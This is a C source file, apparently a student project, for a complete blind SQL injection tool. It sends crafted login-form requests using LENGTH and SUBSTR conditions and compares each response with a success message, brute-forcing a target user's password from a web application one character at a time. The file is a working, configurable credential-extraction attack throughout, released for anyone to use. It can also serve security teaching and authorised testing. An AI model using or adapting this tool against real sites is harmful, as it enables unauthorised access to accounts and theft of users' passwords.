/************************************************************************************************
*
* Description  : SQL Injection tool to recover an user's password.
*                It uses the following injection methods in the $login_form field :
*                "$login_form=$usr_name' AND LENGTH($pwd_col)=i;"        to recover pwd len
*                "$login_form=$usr_name' AND SUBSTR($pwd_col,i,1)='$c';" to recover each char
* 
* Author       : Caille Jimmy, MSE-ICT student in Telecomunication Networks and Information Security
* 
* Prerequisite : install libcurl-dev
* Compile      : gcc attack.c -o attack -lcurl -Wall -Wextra
* Launch       : ./attack -h
*
*      [param] [remark]            [default value]
* Usage: -h    help, this message  -none-
*        -U    URL, necessary !    -none-
*        -u    username            admin
*        -f    username field name login
*        -p    password DB name    password
*        -P    password field name password
*        -m    password min len    1
*        -M    password max len    20
*        -c    char min (decimal)  ' ' (32)
*        -C    char max (decimal)  '~' (126)
*        -s    success message     Welcome
*        -v    verbose             disabled
*        -r    html responses      disabled
*        -d    libcurl debug       disabled
*
* License      : Unlicense, for more information, please refer to <https://unlicense.org>
*
* Version      : v0.2 - attacking multiple usernames
*                v0.3 - parameters added, multiple username removed, cleanup
*                v0.4 - strcpy replaced by strncpy for safely copying parameters
*                       sprintf replaced by snprtinf
*                       differentiates -v verbose   (shows requests)
*                                      -r responses (shows html)
*                                      -d libcurl debug
*                       help displayed when unknown parameter is given
*
*************************************************************************************************/

#define STR_MAX_LEN   100
#define REQ_CONT_TYPE "Content-Type: application/x-www-form-urlencoded"

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h> //boolean
#include <string.h>
#include <unistd.h> //usleep
#include <sys/time.h>
#include "curl/curl.h"

#include "attack.h"

//global vars
CURL *curl;
CURLcode res;
struct string s;
char url[STR_MAX_LEN];                   //stores the URL to attack
char username[STR_MAX_LEN]  ="admin";    //stores the username
char username_f[STR_MAX_LEN]="login";    //stores the username form field
char pwd_d[STR_MAX_LEN]     ="password"; //stores the password DB field
char pwd_i[STR_MAX_LEN]     ="password"; //stores the password form field
char success[STR_MAX_LEN]   ="Welcome";  //stores the success message
int pwd_min =1;
int pwd_max =20;
int char_min=32;
int char_max=126;
bool verbose   =false;
bool responses =false;
bool curl_debug=false;

//main program
int main(int argc, char* argv[]){
  //options
  int opt; 
  //parsing arguments
  //info: start with ':' to distinguish between '?' and ':' 
  while((opt = getopt(argc, argv, ":hvrdU:u:f:p:P:m:M:c:C:s:")) != -1){  
    switch(opt){
      case 'U':
        strncpy(url,optarg,STR_MAX_LEN);
      break;
      case 'u':
        strncpy(username,optarg,STR_MAX_LEN);
      break;
      case 'f':
        strncpy(username_f,optarg,STR_MAX_LEN);
      break;
      case 'p':
        strncpy(pwd_d,optarg,STR_MAX_LEN);
      break;
      case 'P':
        strncpy(pwd_i,optarg,STR_MAX_LEN);
      break;
      case 'm':
        pwd_min = atoi(optarg);
      break;
      case 'M':
        pwd_max = atoi(optarg);
      break;
      case 'c':
        char_min = atoi(optarg);
      break;
      case 'C':
        char_max = atoi(optarg);
      break;
      case 's':
        strncpy(success,optarg,STR_MAX_LEN);
      break;
      case 'v':
        verbose = true;
      break;
      case 'r':
        responses = true;
      break;
      case 'd':
        curl_debug = true;
      break;
      case ':':  
        printf("option needs a value\n");  
      break;
      case '?':
        printf("unknown option: %c\n", optopt);
      case 'h':
        printf("      [param] [remark]            [default value] \n");
        printf("Usage:  -h    help, this message  -none-\n");
        printf("        -U    URL, necessary !    -none-\n");
        printf("        -u    username            %s\n",username);
        printf("        -f    username field name %s\n",username_f);
        printf("        -p    password DB name    %s\n",pwd_d);
        printf("        -P    password field name %s\n",pwd_i);
        printf("        -m    password min len    %d\n",pwd_min);
        printf("        -M    password max len    %d\n",pwd_max);
        printf("        -c    char min (decimal)  '%c' (%d)\n",char_min,char_min);
        printf("        -C    char max (decimal)  '%c' (%d)\n",char_max,char_max);
        printf("        -s    success message     %s\n",success);
        printf("        -v    verbose             disabled\n");
        printf("        -r    html responses      disabled\n");
        printf("        -d    libcurl debug       disabled\n");
        exit(EXIT_SUCCESS);
      break;
    }  
  }
  if(strcmp(url,"")==0){
    printf("No URL set !\nPlease enter one with -U parameter\nExiting...\n");
    exit(EXIT_FAILURE);
  }

  //shows attack parameters
  printParams(username);
  //used to compute running time
  time_t t_begin = time(NULL);
  int    t_span=0;
  //used to recover password length
  int pwd_len=0;
  //used to store password
  char* cracked;

  printf("Checking length... ");
  fflush(stdout);
  for(int i=pwd_min;i<=pwd_max;i++){
    //erase if char not found
    if(!verbose && i>9){
      printf("\b\b");
    }else if(!verbose && i>pwd_min){
      printf("\b");
    }
    
    //print current length checked
    printf("%d",i);
    fflush(stdout);
    
    //wait a bit
    //usleep(100000);//100ms

    //parameters building
    char fields[STR_MAX_LEN];
    
    snprintf(fields,STR_MAX_LEN,"%s=%s' AND LENGTH(%s)=%d;&%s=dummy",username_f,username,pwd_d,i,pwd_i);

    if(verbose) printf("%s\n",fields);
    
    //do request
    if(doRequest(fields)){
      printf(" FOUND!\n");
      pwd_len=i;
      break;
    }
  }
  //test if password length was found
  if(pwd_len==0){
    fprintf(stderr, "\nPassword length not found... (try to set MAX_LEN higher perhaps ?)\nExiting...\n");
    exit(EXIT_FAILURE);
  }
  
  //reserve space for password if size found
  cracked = calloc(pwd_len,sizeof(char));
  if(cracked == NULL){
    fprintf(stderr, "\nmalloc() failed\nExiting...\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
  
  //for each char
  for(int j=pwd_min;j<=pwd_len;j++){
    //print current letter's number
    printf("Brute-forcing %d",j);
    if(j==1 || j==11){
      printf("st letter... ");
    }else if(j==2 || j==12){
      printf("nd letter... ");
    }else if(j==3 || j==13){
      printf("rd letter... ");
    }else{
      printf("th letter... ");
    }
    fflush(stdout);
    //check each char
    bool found=false;
    for(int i=char_min;i<=char_max;i++){
      //erase if char not found
      if(!verbose && i>char_min) printf("\b");
      //print current char
      printf("%c",i);
      fflush(stdout);
      //get corresponding char
      char ch[2];
      sprintf(ch, "%c", i);

      //parameters building
      char fields[STR_MAX_LEN];
      
      snprintf(fields,STR_MAX_LEN,"%s=%s' AND SUBSTR(%s,%d,1)='%s';&%s=dummy",username_f,username,pwd_d,j,ch,pwd_i);

      if(verbose) printf("%s\n",fields);

      if(doRequest(fields)){
        found = true;
        printf(" FOUND!\n");
        //add char to password, normally no risk as its space is reserved
        if(j==char_min){
          strcpy(cracked,ch);
        }else{
          strcat(cracked,ch);
        }
        break;
      }
    }
    //test if char was found
    if(!found){
      fprintf(stderr, "\nChar not found... (try to set END_CHAR higher perhaps ?)\nExiting...\n");
      cleanup();
      exit(EXIT_FAILURE);
    }
  }
  //compute time
  t_span = (double)(time(NULL) - t_begin);
  printf("Password %s found in around %d seconds !\n\n", cracked, t_span);
  
  //clean
  cleanup();
  
  return EXIT_SUCCESS;
}
//cleans library and malloc
void cleanup(){
  if(s.ptr){
    free(s.ptr);
    s.ptr = NULL;
  }
  if(curl) curl_easy_cleanup(curl);
  curl_global_cleanup();
}

//print parameters
void printParams(char* usr){
  printf("URL to attack  : %s\n",url);
  printf("Parameters are : %s=%s&%s\n",username_f,usr,pwd_i);
  printf("Success message: %s\n",success);
  printf("Verbose is     : %s\n",verbose ? "enabled" : "disabled");
  printf("Pwd len min/max: %d-%d\n",pwd_min,pwd_max);
  printf("Char min/max   : %d-%d\n",char_min,char_max);
  printf("Corresponding  : ");
  for(int i=char_min;i<=char_max;i++){
    printf("%c",i);
  }
  printf("\n\n");
}

//init string for response handling
void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if(s->ptr == NULL){
    fprintf(stderr, "\nmalloc() failed\nExiting...\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

//write response in given string
size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s){
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "\nrealloc() failed\nExiting...\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

/*do request (connect) with given parameters
 *returns: 1 success, 0 failed
 */
int doRequest(char* params){
  if(curl == NULL){
    /* In windows, this will init the winsock stuff */
    curl_global_init(CURL_GLOBAL_ALL);
    /* get a curl handle */
    curl = curl_easy_init();
  }
  if(curl){
    init_string(&s);
    //debug
    if(curl_debug) curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
    //set function to handle response
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    //set string to save response
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    //set request url
    curl_easy_setopt(curl, CURLOPT_URL, url);
    //set request data
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params);
    //set content type
    struct curl_slist *hs=NULL;
    hs = curl_slist_append(hs, REQ_CONT_TYPE);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hs);
    //set request type
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    //perform request
    res = curl_easy_perform(curl);
    //check for errors
    if(res != CURLE_OK){
      fprintf(stderr, "\ncurl_easy_perform() failed: %s\nExiting...\n",curl_easy_strerror(res));
      cleanup();
      exit(EXIT_FAILURE);
    }
    if(responses) printf("%s\n", s.ptr);
    //verify response
    if(strstr(s.ptr, success) != NULL){
      if(s.ptr){
        free(s.ptr);
        s.ptr = NULL;
      }
      return 1;
    }else{
      if(s.ptr){
        free(s.ptr);
        s.ptr = NULL;
      }
      return 0;
    }
  }else{
    fprintf(stderr, "\ncurl_global_init() failed\nExiting...\n");
    cleanup();
    exit(EXIT_FAILURE);
  }
}